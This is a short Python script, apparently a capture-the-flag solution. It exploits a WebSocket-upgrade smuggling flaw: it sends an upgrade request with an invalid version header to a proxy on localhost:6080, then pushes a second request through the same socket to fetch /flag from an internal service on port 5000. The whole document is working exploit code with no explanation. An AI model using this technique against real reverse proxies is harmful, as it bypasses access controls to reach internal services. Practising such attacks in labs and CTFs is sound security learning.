import socket

HOST = 'localhost'
PORT = 6080

req1 = '''GET /socket.io/?transport=websocket HTTP/1.1
Host: localhost:6080
Upgrade: websocket
Sec-WebSocket-Version: aaa
Connection: Upgrade

'''.replace('\n', '\r\n').encode('utf-8')

req2 = '''GET /flag HTTP/1.1
Host: localhost:5000

'''.replace('\n', '\r\n').encode('utf-8')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

s.sendall(req1)
data = s.recv(4096)

print(data)
s.sendall(req2)
data = s.recv(4096)

s.close()

print(data)
